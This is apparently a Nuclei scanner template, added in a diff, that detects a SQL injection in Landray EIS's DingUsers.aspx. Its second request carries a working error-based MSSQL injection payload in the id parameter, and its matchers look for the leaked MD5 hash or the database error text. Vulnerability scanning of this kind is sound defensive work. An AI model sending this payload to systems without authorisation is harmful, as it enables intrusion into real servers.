@@ -1,0 +1,42 @@
+id: landray-eis-dingusers-sql-injection
+info:
+  name: Landray EIS DingUsers.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,landray
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "1"
+    method: GET
+    path:
+      - "{{BaseURL}}/SM/DingUsers.aspx?id=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "扩展属性"
+
+  - id: "2"
+    method: GET
+    path:
+      - "{{BaseURL}}/SM/DingUsers.aspx?id=1%20and%201=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: regex
+        regex:
+          - "0x{{t2}}"
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
